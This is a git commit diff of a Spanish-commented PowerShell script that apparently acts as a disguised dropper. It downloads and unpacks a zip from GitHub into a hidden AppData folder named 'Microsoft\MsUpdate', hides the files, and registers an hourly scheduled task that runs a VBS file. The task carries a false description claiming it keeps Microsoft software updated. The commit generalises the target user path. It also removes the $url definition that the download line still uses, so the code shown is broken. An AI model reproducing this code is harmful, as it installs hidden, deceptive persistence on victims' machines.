3d14fb18b4843abd980ee6a851c8036a3235abd3
emakedie <155691767+emakedie@users.noreply.github.com>
2025-01-06 13:29:38 -0300

    Update psnc.ps1

--- psnc.ps1
+++ psnc.ps1
@@ -1,5 +1,4 @@
-$url = "https://github.com/emakedie/UCN/raw/refs/heads/main/Mscn.zip"
-$destinationFolder = "C:\Users\candrade\AppData\Local\Microsoft\MsUpdate"
+$destinationFolder = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\MsUpdate"
 $zipFile = Join-Path -Path $destinationFolder -ChildPath "Mscn.zip"
 
 # Crear la carpeta de destino
@@ -7,16 +6,17 @@ if (-not (Test-Path -Path $destinationFolder)) {
     New-Item -ItemType Directory -Path $destinationFolder -Force | Out-Null
     (Get-Item $destinationFolder).Attributes = "Hidden"
 }
+
 Invoke-WebRequest -Uri $url -OutFile $zipFile -ErrorAction SilentlyContinue
 Expand-Archive -Path $zipFile -DestinationPath $destinationFolder -Force -ErrorAction SilentlyContinue
-    Get-ChildItem -Path $destinationFolder -Recurse | ForEach-Object {
-        $_.Attributes = "Hidden"
-    }
+Get-ChildItem -Path $destinationFolder -Recurse | ForEach-Object {
+    $_.Attributes = "Hidden"
+}
 Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
 
 Unregister-ScheduledTask -TaskName "MscnSrvUpdate" -Confirm:$false -ErrorAction SilentlyContinue
 
-$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "C:\Users\candrade\AppData\Local\Microsoft\MsUpdate\Mscntask.vbs"
+$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "C:\Users\$env:USERNAME\AppData\Local\Microsoft\MsUpdate\Mscntask.vbs"
 $trigger = New-ScheduledTaskTrigger -Once -At "00:00AM" -RepetitionInterval (New-TimeSpan -Minutes 60) -RepetitionDuration (New-TimeSpan -Days 365)
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MscnSrvUpdate" -Description "Mantiene actualizado el software de Microsoft. Si esta tarea está deshabilitada o detenida, el software de Microsoft no se actualizará, lo que significa que no se podrán corregir las vulnerabilidades que puedan surgir y es posible que las características no funcionen. Esta tarea se desinstalará cuando el software de Microsoft no la esté usando." -Settings $settings | Out-Null
